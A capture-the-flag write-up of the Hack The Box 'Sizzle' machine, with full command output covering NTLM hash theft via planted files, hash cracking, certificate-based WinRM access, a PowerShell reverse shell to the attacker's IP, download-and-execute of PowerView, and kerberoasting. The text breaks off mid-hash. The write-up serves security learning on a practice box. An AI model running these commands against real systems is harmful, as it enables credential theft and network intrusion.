+++
date = '2025-02-28T22:59:51-05:00'
draft = false
title = 'HtB Sizzle'
tags = ['writeup','hack the box','insane','windows','active directory']
hideToc = false
+++
![HtB-Sizzle](/images/Sizzle.png)

Sizzle is an Insane difficulty WIndows box with an Active Directory environment. A writable directory in an SMB share allows to steal NTLM hashes which can be cracked to access the Certificate Services Portal. A self signed certificate can be created using the CA and used for PSRemoting. A SPN associated with a user allows a kerberoast attack on the box. The user is found to have Replication rights which can be abused to get Administrator hashes via DCSync.

<!--more-->
---

## Scanning

### nmap

```sh
┌──(pl4stic㉿kali)-[~/htb/sizzle]
└─$ nmap -T4 -p- -A 10.129.124.103                  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-25 22:31 EST
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Site doesn\'t have a title (text/html).
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2025-02-26T03:37:42+00:00; +1m53s from scanner time.
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:sizzle.HTB.LOCAL
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-02-11T12:59:51
| Not valid after:  2022-02-11T12:59:51
| MD5:   6346:07e3:ae83:0744:681e:3c0b:00ff:80d9
|_SHA-1: e071:44af:92c6:e202:8f21:0fc6:c9c7:433b:360b:e3a9
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| ssl-cert: Subject: commonName=sizzle.htb.local
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-07-03T17:58:55
| Not valid after:  2020-07-02T17:58:55
| MD5:   240b:1eff:5a65:ad8d:c64d:855e:aeb5:9e6b
|_SHA-1: 77bb:3f67:1b6b:3e09:b8f9:6503:ddc1:0bbf:0b75:0c72
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2025-02-26T03:37:42+00:00; +1m53s from scanner time.
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Site doesn\'t have a title (text/html).
|_http-server-header: Microsoft-IIS/10.0
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2025-02-26T03:37:42+00:00; +1m53s from scanner time.
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:sizzle.HTB.LOCAL
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-02-11T12:59:51
| Not valid after:  2022-02-11T12:59:51
| MD5:   6346:07e3:ae83:0744:681e:3c0b:00ff:80d9
|_SHA-1: e071:44af:92c6:e202:8f21:0fc6:c9c7:433b:360b:e3a9
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:sizzle.HTB.LOCAL
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-02-11T12:59:51
| Not valid after:  2022-02-11T12:59:51
| MD5:   6346:07e3:ae83:0744:681e:3c0b:00ff:80d9
|_SHA-1: e071:44af:92c6:e202:8f21:0fc6:c9c7:433b:360b:e3a9
|_ssl-date: 2025-02-26T03:37:42+00:00; +1m53s from scanner time.
3269/tcp  open  ssl/ldap
|_ssl-date: 2025-02-26T03:37:42+00:00; +1m53s from scanner time.
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:sizzle.HTB.LOCAL
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-02-11T12:59:51
| Not valid after:  2022-02-11T12:59:51
| MD5:   6346:07e3:ae83:0744:681e:3c0b:00ff:80d9
|_SHA-1: e071:44af:92c6:e202:8f21:0fc6:c9c7:433b:360b:e3a9
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:sizzle.HTB.LOCAL
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-02-11T12:59:51
| Not valid after:  2022-02-11T12:59:51
| MD5:   6346:07e3:ae83:0744:681e:3c0b:00ff:80d9
|_SHA-1: e071:44af:92c6:e202:8f21:0fc6:c9c7:433b:360b:e3a9
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2025-02-26T03:37:42+00:00; +1m53s from scanner time.
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2016|2008|7 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2016 (89%), Microsoft Windows 7 or Windows Server 2008 R2 (85%)
```

### HTTP - 80/tcp

![sizzle1](/images/sizzle1.png)

```sh
┌──(pl4stic㉿kali)-[~/htb/sizzle]
└─$ gobuster dir -u http://10.129.124.103/ -w /usr/share/wordlists/dirb/common.txt                                  
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.124.103/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/aspnet_client        (Status: 301) [Size: 159] [--> http://10.129.124.103/aspnet_client/]
/certenroll           (Status: 301) [Size: 156] [--> http://10.129.124.103/certenroll/]
/certsrv              (Status: 401) [Size: 1293]
/Images               (Status: 301) [Size: 152] [--> http://10.129.124.103/Images/]
/images               (Status: 301) [Size: 152] [--> http://10.129.124.103/images/]
/index.html           (Status: 200) [Size: 60]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

Interesting endpoint, but we'll have to revisit this once we have credentials.

![sizzle3](/images/sizzle3.png)

### SMB - 443/tcp

```sh
┌──(pl4stic㉿kali)-[~/htb/sizzle]
└─$ smbclient -L \\\\10.129.124.103\\              
Password for [WORKGROUP\pl4stic]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        CertEnroll      Disk      Active Directory Certificate Services share
        Department Shares Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Operations      Disk      
        SYSVOL          Disk      Logon server share
```

Interesting directory listing in the `Department Shares` SMB share.

```sh
┌──(pl4stic㉿kali)-[~/htb/sizzle]
└─$ smbclient \\\\10.129.124.103\\Department\ Shares
Password for [WORKGROUP\pl4stic]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Jul  3 11:22:32 2018
  ..                                  D        0  Tue Jul  3 11:22:32 2018
  Accounting                          D        0  Mon Jul  2 15:21:43 2018
  Audit                               D        0  Mon Jul  2 15:14:28 2018
  Banking                             D        0  Tue Jul  3 11:22:39 2018
  CEO_protected                       D        0  Mon Jul  2 15:15:01 2018
  Devops                              D        0  Mon Jul  2 15:19:33 2018
  Finance                             D        0  Mon Jul  2 15:11:57 2018
  HR                                  D        0  Mon Jul  2 15:16:11 2018
  Infosec                             D        0  Mon Jul  2 15:14:24 2018
  Infrastructure                      D        0  Mon Jul  2 15:13:59 2018
  IT                                  D        0  Mon Jul  2 15:12:04 2018
  Legal                               D        0  Mon Jul  2 15:12:09 2018
  M&A                                 D        0  Mon Jul  2 15:15:25 2018
  Marketing                           D        0  Mon Jul  2 15:14:43 2018
  R&D                                 D        0  Mon Jul  2 15:11:47 2018
  Sales                               D        0  Mon Jul  2 15:14:37 2018
  Security                            D        0  Mon Jul  2 15:21:47 2018
  Tax                                 D        0  Mon Jul  2 15:16:54 2018
  Users                               D        0  Tue Jul 10 17:39:32 2018
  ZZ_ARCHIVE                          D        0  Mon Jul  2 15:32:58 2018
```

And we even found some possible usernames in the `Users` folder...

```sh
smb: \Users\> ls
  .                                   D        0  Tue Jul 10 17:39:32 2018
  ..                                  D        0  Tue Jul 10 17:39:32 2018
  amanda                              D        0  Mon Jul  2 15:18:43 2018
  amanda_adm                          D        0  Mon Jul  2 15:19:06 2018
  bill                                D        0  Mon Jul  2 15:18:28 2018
  bob                                 D        0  Mon Jul  2 15:18:31 2018
  chris                               D        0  Mon Jul  2 15:19:14 2018
  henry                               D        0  Mon Jul  2 15:18:39 2018
  joe                                 D        0  Mon Jul  2 15:18:34 2018
  jose                                D        0  Mon Jul  2 15:18:53 2018
  lkys37en                            D        0  Tue Jul 10 17:39:04 2018
  morgan                              D        0  Mon Jul  2 15:18:48 2018
  mrb3n                               D        0  Mon Jul  2 15:19:20 2018
  Public                              D        0  Wed Sep 26 01:45:32 2018
```

And some interesting files in the `ZZ_ARCHIVE` folder, all the same size and no real contents of use...

```sh
smb: \ZZ_ARCHIVE\> ls
  .                                   D        0  Mon Jul  2 15:32:58 2018
  ..                                  D        0  Mon Jul  2 15:32:58 2018
  AddComplete.pptx                    A   419430  Mon Jul  2 15:32:58 2018
  AddMerge.ram                        A   419430  Mon Jul  2 15:32:57 2018
  ConfirmUnprotect.doc                A   419430  Mon Jul  2 15:32:57 2018
  ConvertFromInvoke.mov               A   419430  Mon Jul  2 15:32:57 2018
  ConvertJoin.docx                    A   419430  Mon Jul  2 15:32:57 2018
  CopyPublish.ogg                     A   419430  Mon Jul  2 15:32:57 2018
  DebugMove.mpg                       A   419430  Mon Jul  2 15:32:57 2018
  DebugSelect.mpg                     A   419430  Mon Jul  2 15:32:58 2018
  DebugUse.pptx                       A   419430  Mon Jul  2 15:32:57 2018
  DisconnectApprove.ogg               A   419430  Mon Jul  2 15:32:58 2018
  DisconnectDebug.mpeg2               A   419430  Mon Jul  2 15:32:57 2018
  EditCompress.xls                    A   419430  Mon Jul  2 15:32:57 2018
  EditMount.doc                       A   419430  Mon Jul  2 15:32:58 2018
  EditSuspend.mp3                     A   419430  Mon Jul  2 15:32:58 2018
  EnableAdd.pptx                      A   419430  Mon Jul  2 15:32:57 2018
  EnablePing.mov                      A   419430  Mon Jul  2 15:32:58 2018
  EnableSend.ppt                      A   419430  Mon Jul  2 15:32:58 2018
  EnterMerge.mpeg                     A   419430  Mon Jul  2 15:32:57 2018
  ExitEnter.mpg                       A   419430  Mon Jul  2 15:32:58 2018
  ExportEdit.ogg                      A   419430  Mon Jul  2 15:32:57 2018
  GetOptimize.pdf                     A   419430  Mon Jul  2 15:32:58 2018
  GroupSend.rm                        A   419430  Mon Jul  2 15:32:58 2018
  HideExpand.rm                       A   419430  Mon Jul  2 15:32:58 2018
  InstallWait.pptx                    A   419430  Mon Jul  2 15:32:57 2018
  JoinEnable.ram                      A   419430  Mon Jul  2 15:32:58 2018
  LimitInstall.doc                    A   419430  Mon Jul  2 15:32:57 2018
  LimitStep.ppt                       A   419430  Mon Jul  2 15:32:57 2018
  MergeBlock.mp3                      A   419430  Mon Jul  2 15:32:58 2018
  MountClear.mpeg2                    A   419430  Mon Jul  2 15:32:57 2018
  MoveUninstall.docx                  A   419430  Mon Jul  2 15:32:57 2018
  NewInitialize.doc                   A   419430  Mon Jul  2 15:32:57 2018
  OutConnect.mpeg2                    A   419430  Mon Jul  2 15:32:58 2018
  PingGet.dot                         A   419430  Mon Jul  2 15:32:58 2018
  ReceiveInvoke.mpeg2                 A   419430  Mon Jul  2 15:32:56 2018
  RemoveEnter.mpeg3                   A   419430  Mon Jul  2 15:32:57 2018
  RemoveRestart.mpeg                  A   419430  Mon Jul  2 15:32:57 2018
  RequestJoin.mpeg2                   A   419430  Mon Jul  2 15:32:58 2018
  RequestOpen.ogg                     A   419430  Mon Jul  2 15:32:58 2018
  ResetCompare.avi                    A   419430  Mon Jul  2 15:32:58 2018
  ResetUninstall.mpeg                 A   419430  Mon Jul  2 15:32:58 2018
  ResumeCompare.doc                   A   419430  Mon Jul  2 15:32:58 2018
  SelectPop.ogg                       A   419430  Mon Jul  2 15:32:57 2018
  SuspendWatch.mp4                    A   419430  Mon Jul  2 15:32:58 2018
  SwitchConvertFrom.mpg               A   419430  Mon Jul  2 15:32:57 2018
  UndoPing.rm                         A   419430  Mon Jul  2 15:32:58 2018
  UninstallExpand.mp3                 A   419430  Mon Jul  2 15:32:57 2018
  UnpublishSplit.ppt                  A   419430  Mon Jul  2 15:32:58 2018
  UnregisterPing.pptx                 A   419430  Mon Jul  2 15:32:57 2018
  UpdateRead.mpeg                     A   419430  Mon Jul  2 15:32:57 2018
  WaitRevoke.pptx                     A   419430  Mon Jul  2 15:32:57 2018
  WriteUninstall.mp3                  A   419430  Mon Jul  2 15:32:58 2018
```

## Initial Access

### SMB Write Access

After hitting a bunch of dead ends with entry points, I decided to come back to SMB and see if there were any writeable directories in the `Department Shares` folder. While there were a ton of folders to go through, I was successful... we can write at `\Users\Public`.

In this case, I'm going to use `ntlm-theft` to generate a handful of files that can, in some cases, steal NTLM hashes of users who may navigate to this directory and/or open any of the files. [NTLM Theft GitHub](https://github.com/Greenwolf/ntlm_theft)

```sh
┌──(pl4stic㉿kali)-[~/htb/sizzle/ntlmtheft]
└─$ python3 /opt/ntlm_theft/ntlm_theft.py --generate all --server 10.10.14.142 --filename openme
Created: openme/openme.scf (BROWSE TO FOLDER)
Created: openme/openme-(url).url (BROWSE TO FOLDER)
Created: openme/openme-(icon).url (BROWSE TO FOLDER)
Created: openme/openme.lnk (BROWSE TO FOLDER)
Created: openme/openme.rtf (OPEN)
Created: openme/openme-(stylesheet).xml (OPEN)
Created: openme/openme-(fulldocx).xml (OPEN)
Created: openme/openme.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: openme/openme-(includepicture).docx (OPEN)
Created: openme/openme-(remotetemplate).docx (OPEN)
Created: openme/openme-(frameset).docx (OPEN)
Created: openme/openme-(externalcell).xlsx (OPEN)
Created: openme/openme.wax (OPEN)
Created: openme/openme.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: openme/openme.asx (OPEN)
Created: openme/openme.jnlp (OPEN)
Created: openme/openme.application (DOWNLOAD AND OPEN)
Created: openme/openme.pdf (OPEN AND ALLOW)
Created: openme/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: openme/Autorun.inf (BROWSE TO FOLDER)
Created: openme/desktop.ini (BROWSE TO FOLDER)
Generation Complete.
```

Now upload all of these files to the `\Users\Public` folder, set up Responder, and wait.
`sudo responder -I tun0`

```sh
┌──(pl4stic㉿kali)-[~/htb/sizzle/ntlmtheft/openme]
└─$ smbclient \\\\10.129.124.103\\Department\ Shares
Password for [WORKGROUP\pl4stic]:
Try "help" to get a list of possible commands.
smb: \> recurse
smb: \> prompt no
smb: \> cd Users\Public
smb: \Users\Public\> mput *
putting file openme.asx as \Users\Public\openme.asx (0.8 kb/s) (average 0.8 kb/s)
putting file openme-(stylesheet).xml as \Users\Public\openme-(stylesheet).xml (2.1 kb/s) (average 1.2 kb/s)
putting file openme.m3u as \Users\Public\openme.m3u (0.5 kb/s) (average 1.0 kb/s)
putting file openme.htm as \Users\Public\openme.htm (1.1 kb/s) (average 1.0 kb/s)
putting file Autorun.inf as \Users\Public\Autorun.inf (1.0 kb/s) (average 1.0 kb/s)
putting file openme-(includepicture).docx as \Users\Public\openme-(includepicture).docx (75.6 kb/s) (average 16.4 kb/s)
putting file openme.pdf as \Users\Public\openme.pdf (6.4 kb/s) (average 14.9 kb/s)
putting file openme.jnlp as \Users\Public\openme.jnlp (2.1 kb/s) (average 13.5 kb/s)
putting file openme-(externalcell).xlsx as \Users\Public\openme-(externalcell).xlsx (5.5 kb/s) (average 9.1 kb/s)
putting file openme-(fulldocx).xml as \Users\Public\openme-(fulldocx).xml (294.1 kb/s) (average 41.4 kb/s)
putting file openme.wax as \Users\Public\openme.wax (0.7 kb/s) (average 40.0 kb/s)
putting file zoom-attack-instructions.txt as \Users\Public\zoom-attack-instructions.txt (1.4 kb/s) (average 38.7 kb/s)
putting file openme.application as \Users\Public\openme.application (21.2 kb/s) (average 38.1 kb/s)
putting file openme.scf as \Users\Public\openme.scf (0.9 kb/s) (average 36.7 kb/s)
putting file openme.lnk as \Users\Public\openme.lnk (26.8 kb/s) (average 36.4 kb/s)
putting file openme-(remotetemplate).docx as \Users\Public\openme-(remotetemplate).docx (259.3 kb/s) (average 44.8 kb/s)
putting file openme-(url).url as \Users\Public\openme-(url).url (0.7 kb/s) (average 43.5 kb/s)
putting file openme.rtf as \Users\Public\openme.rtf (1.3 kb/s) (average 42.4 kb/s)
putting file openme-(frameset).docx as \Users\Public\openme-(frameset).docx (128.0 kb/s) (average 44.7 kb/s)
putting file desktop.ini as \Users\Public\desktop.ini (0.5 kb/s) (average 43.3 kb/s)
putting file openme-(icon).url as \Users\Public\openme-(icon).url (1.3 kb/s) (average 42.2 kb/s)
```

And we got a hash for `amanda`!

```sh
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.124.103
[SMB] NTLMv2-SSP Username : HTB\amanda
[SMB] NTLMv2-SSP Hash     : amanda::HTB:8a9f1b623bfe46f5:384CA8E4CB42B0ECDE0D9B7F1C269094:01010000000000008068928ADB87DB01F4727A7770FD53BE00000000020008004A0037004300320001001E00570049004E002D00410059005A004E004900300054005A0030003800450004003400570049004E002D00410059005A004E004900300054005A003000380045002E004A003700430032002E004C004F00430041004C00030014004A003700430032002E004C004F00430041004C00050014004A003700430032002E004C004F00430041004C00070008008068928ADB87DB0106000400020000000800300030000000000000000100000000200000AB323F71F0E9979946045431F8B44E0E8D558B1768754391F2DCC6D3CF5DA9E00A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310034003200000000000000000000000000
```

### NTLMv2 Hash Crack

```sh
┌──(pl4stic㉿kali)-[~/htb/sizzle/ntlmtheft/openme]
└─$ hashcat amanda-hash.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
[...snip...]
AMANDA::HTB:8a9f1b623bfe46f5:384ca8e4cb42b0ecde0d9b7f1c269094:01010000000000008068928adb87db01f4727a7770fd53be00000000020008004a0037004300320001001e00570049004e002d00410059005a004e004900300054005a0030003800450004003400570049004e002d00410059005a004e004900300054005a003000380045002e004a003700430032002e004c004f00430041004c00030014004a003700430032002e004c004f00430041004c00050014004a003700430032002e004c004f00430041004c00070008008068928adb87db0106000400020000000800300030000000000000000100000000200000ab323f71f0e9979946045431f8b44e0e8d558b1768754391f2dcc6d3cf5da9e00a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e00310034003200000000000000000000000000:Ashare1972
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: AMANDA::HTB:8a9f1b623bfe46f5:384ca8e4cb42b0ecde0d9b...000000
Time.Started.....: Tue Feb 25 23:21:51 2025 (4 secs)
Time.Estimated...: Tue Feb 25 23:21:55 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
```

And finally, some creds: `HTB.local\amanda:Ashare1972`

## Amanda's Credentials

### Bloodhound

Let's see if Amanda's credentials can get us a Bloodhound dump via LDAP, and then explore what our next steps might be.

```sh
┌──(pl4stic㉿kali)-[~/htb/sizzle]
└─$ netexec ldap 10.129.124.103 -d htb.local -u amanda -p 'Ashare1972' --bloodhound -c all --dns-server 10.129.124.103 --dns-tcp
SMB         10.129.124.103  445    SIZZLE           [*] Windows 10 / Server 2016 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)
LDAP        10.129.124.103  389    SIZZLE           [+] htb.local\amanda:Ashare1972 
LDAP        10.129.124.103  389    SIZZLE           Resolved collection methods: dcom, acl, objectprops, rdp, container, trusts, localadmin, psremote, group, session
LDAP        10.129.124.103  389    SIZZLE           Done in 00M 07S
LDAP        10.129.124.103  389    SIZZLE           Compressing output into /home/pl4stic/.nxc/logs/SIZZLE_10.129.124.103_2025-02-25_233948_bloodhound.zip
```

Looks like Amanda has `CanPSRemote` to the `SIZZLE.HTB.LOCAL` machine... tried using `evil-winrm` but no luck. Maybe we need a stronger form of authentication?

![sizzle2](/images/sizzle2.png)

### SMB

Looks like Amanda's credentials got us a bit more access to the SMB shares, let's check them out.

```sh
┌──(pl4stic㉿kali)-[~/htb/sizzle/ntlmtheft/openme]
└─$ netexec smb 10.129.124.103 -d htb.local -u amanda -p 'Ashare1972' --shares
SMB         10.129.124.103  445    SIZZLE           [*] Windows 10 / Server 2016 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.124.103  445    SIZZLE           [+] htb.local\amanda:Ashare1972 
SMB         10.129.124.103  445    SIZZLE           [*] Enumerated shares
SMB         10.129.124.103  445    SIZZLE           Share           Permissions     Remark
SMB         10.129.124.103  445    SIZZLE           -----           -----------     ------
SMB         10.129.124.103  445    SIZZLE           ADMIN$                          Remote Admin
SMB         10.129.124.103  445    SIZZLE           C$                              Default share
SMB         10.129.124.103  445    SIZZLE           CertEnroll      READ            Active Directory Certificate Services share                                                                                                                 
SMB         10.129.124.103  445    SIZZLE           Department Shares READ            
SMB         10.129.124.103  445    SIZZLE           IPC$            READ            Remote IPC
SMB         10.129.124.103  445    SIZZLE           NETLOGON        READ            Logon server share 
SMB         10.129.124.103  445    SIZZLE           Operations                      
SMB         10.129.124.103  445    SIZZLE           SYSVOL          READ            Logon server share
```

And we definitely found some goodies in `CertEnroll`:

```sh
┌──(pl4stic㉿kali)-[~/htb/sizzle/ntlmtheft/openme]
└─$ smbclient \\\\10.129.124.103\\CertEnroll -U amanda%Ashare1972                   
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Feb 25 22:32:44 2025
  ..                                  D        0  Tue Feb 25 22:32:44 2025
  HTB-SIZZLE-CA+.crl                  A      721  Tue Feb 25 22:32:44 2025
  HTB-SIZZLE-CA.crl                   A      909  Tue Feb 25 22:32:44 2025
  nsrev_HTB-SIZZLE-CA.asp             A      322  Mon Jul  2 16:36:05 2018
  sizzle.HTB.LOCAL_HTB-SIZZLE-CA.crt      A      871  Mon Jul  2 16:36:03 2018

                7779839 blocks of size 4096. 3510958 blocks available
```

Seeing this share, and these files, reminds me of the `/certsrv` endpoint we found on the web server earlier. Let's revisit.

### Certificate Server

![sizzle4](/images/sizzle4.png)

Let's request a certificate, and then select "advanced certificate request".

![sizzle5](/images/sizzle5.png)

We can run the following command to generate a new certificate signing request and subsequent key, then paste the generated `.csr` into our web portal to grab a valid certificate from the server.

![sizzle6](/images/sizzle6.png)

Now we can use this certificate to hopefully take advantage of Amanda's `CanPSRemote` permission.

```sh
┌──(pl4stic㉿kali)-[~/htb/sizzle]
└─$ evil-winrm -c certnew.cer -k pl4stic.key -i 10.129.124.103 -u amanda -p Ashare1972 -S
                                        
Evil-WinRM shell v3.7
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\amanda\Documents>
```

## Shell as Amanda

### Check SPN Accounts

Now that we have shell access as Amanda, we can begin to enumerate the machine for any juicy nuggets. I tried a few things, but then had success in searching for kerberoastable accounts by checking to see which accounts were in use as SPN. Looks like we might be able to run a kerberoast on `mrlky`.

```PowerShell
*Evil-WinRM* PS C:\Users\amanda\Documents> setspn -T htb.local -Q */*
Checking domain DC=HTB,DC=LOCAL
CN=SIZZLE,OU=Domain Controllers,DC=HTB,DC=LOCAL
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/sizzle.HTB.LOCAL
        ldap/sizzle.HTB.LOCAL/ForestDnsZones.HTB.LOCAL
        ldap/sizzle.HTB.LOCAL/DomainDnsZones.HTB.LOCAL
        DNS/sizzle.HTB.LOCAL
        GC/sizzle.HTB.LOCAL/HTB.LOCAL
        RestrictedKrbHost/sizzle.HTB.LOCAL
        RestrictedKrbHost/SIZZLE
        RPC/717ef311-0653-41c6-8db6-81526d6f4985._msdcs.HTB.LOCAL
        HOST/SIZZLE/HTB
        HOST/sizzle.HTB.LOCAL/HTB
        HOST/SIZZLE
        HOST/sizzle.HTB.LOCAL
        HOST/sizzle.HTB.LOCAL/HTB.LOCAL
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/717ef311-0653-41c6-8db6-81526d6f4985/HTB.LOCAL
        ldap/SIZZLE/HTB
        ldap/717ef311-0653-41c6-8db6-81526d6f4985._msdcs.HTB.LOCAL
        ldap/sizzle.HTB.LOCAL/HTB
        ldap/SIZZLE
        ldap/sizzle.HTB.LOCAL
        ldap/sizzle.HTB.LOCAL/HTB.LOCAL
CN=krbtgt,CN=Users,DC=HTB,DC=LOCAL
        kadmin/changepw
CN=mrlky,CN=Users,DC=HTB,DC=LOCAL
        http/sizzle

Existing SPN found!
```

### Kerberoast: mrlky

Trying to get `PowerView.ps1` on the system is proving to be difficult, as we're currently under a constrained language mode.

```PowerShell
*Evil-WinRM* PS C:\Users\amanda\Documents> IEX(New-Object Net.Webclient).downloadString('http://10.10.16.72/PowerView.ps1')
Cannot create type. Only core types are supported in this language mode.
At line:1 char:5
+ IEX(New-Object Net.Webclient).downloadString('http://10.10.16.72/Powe ...
+     ~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (:) [New-Object], PSNotSupportedException
    + FullyQualifiedErrorId : CannotCreateTypeConstrainedLanguage,Microsoft.PowerShell.Commands.NewObjectCommand
```

Let's try a workaround using the Nishang reverse shell and some PowerShell trickery. Don't forget to edit your shell script and add a line at the bottom so it not only loads the modules, but also calls your reverse shell...

```PowerShell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.142 -Port 4444
```

```sh
*Evil-WinRM* PS C:\Users\amanda\Documents> wget http://10.10.14.142/shell.ps1 -OutFile shell.ps1

*Evil-WinRM* PS C:\Users\amanda\Documents> powershell -v 2 -ExecutionPolicy Bypass .\shell.ps1
```

Now we should be able to load `PowerView.ps1` and execute its functions. In this case, we want to utilize `Invoke-Kerberoast`.

```PowerShell
PS C:\Users\amanda\Documents>IEX(New-Object Net.Webclient).downloadString('http://10.10.14.142/PowerView.ps1')   
PS C:\Users\amanda\Documents> $SecPassword = ConvertTo-SecureString 'Ashare1972' -AsPlainText -Force
PS C:\Users\amanda\Documents> $Cred = New-Object System.Management.Automation.PSCredential('HTB.LOCAL\amanda', $SecPassword)
PS C:\Users\amanda\Documents> Invoke-Kerberoast -Credential $Cred -Verbose | fl


SamAccountName       : mrlky
DistinguishedName    : CN=mrlky,CN=Users,DC=HTB,DC=LOCAL
ServicePrincipalName : http/sizzle
TicketByteHexStream  : 
Hash                 : $krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle*$75E173DA4709D562130584227CA4F1EE$
                       FDF6AB981CE096ADC09C3254D911E46457C918AF70D96C807EFA8EE36A98D407BAF8BD7EC60
                       0664A85B971C9800D94BD8F556F8C6BA66670F6EEEBBC5CF7249C0B0BA189963F9AF0635878
